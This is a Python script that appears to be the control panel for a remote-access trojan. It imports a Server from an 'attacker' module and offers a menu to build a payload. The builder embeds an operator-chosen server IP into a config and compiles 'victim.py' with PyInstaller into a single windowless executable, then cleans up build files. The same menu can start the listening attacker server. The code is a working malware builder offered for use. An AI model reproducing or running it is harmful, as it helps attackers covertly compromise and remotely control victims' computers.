import subprocess
from attacker import Server
import json

print(r'''
      
         ___         _______     ______     _______     ________     ________           _______    __     __       __
        / _ \       /  _____|   /  ____|   |   ____|   /   _____|   /  ______|        /  ______|  |  |   |  |___  |  |
       / /_\ \     |  |        |  |        |  |__     |  |_____    |  |_____         |  |        _|  |_  |   ___| |  |
      /  ___  \    |  |        |  |        |   __|     \____   \    \____   \        |  |       |_    _| |  /     |  |
     /  /   \  \   |  |_____   |  |_____   |  |____    _____|   |   _____|  |        |  |______   |  |   |  |     |  |
    /__/     \__\   \_______|   \______|   |_______|  |________/   |_______/          \________|  |__|   |__|     |__|
''')

while True:

    print("[1] Create payload \n[2] Start server\n[3] Exit")

    command = input("Enter your command no. : ")

    if command == "1":
        print("""
    [+] Client Builder Started

    [+] Step 1: Collecting configuration
    [+] Step 2: Embedding server IP
    [+] Step 3: Generating executable
    [+] Step 4: Finalizing build

    ====================================
    """)
        
        ip = input("Enter server ip : ")

        if ip == "exit":
            continue

        with open("client_config.json","r") as f:
            data = json.load(f)
        
        data["host_ip"] = ip

        with open("client_config.json","w") as f:
            json.dump(data, f, indent=4)

        # subprocess.run("pyinstaller --onefile --noconsole --clean --distpath . --add-data client_config.json;. sample.py", shell=True)
        subprocess.run([
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--distpath", ".",
        "--add-data", "client_config.json;.",
        "victim.py"
        ]) 
        subprocess.run("rmdir /s /q build", shell=True)
        subprocess.run("del victim.spec", shell=True)

    elif command == "2":
        server = Server()
        server.run()
    elif command == "3":
        print("programme closed...")
        break
    else:
        print("Invalid Command...")


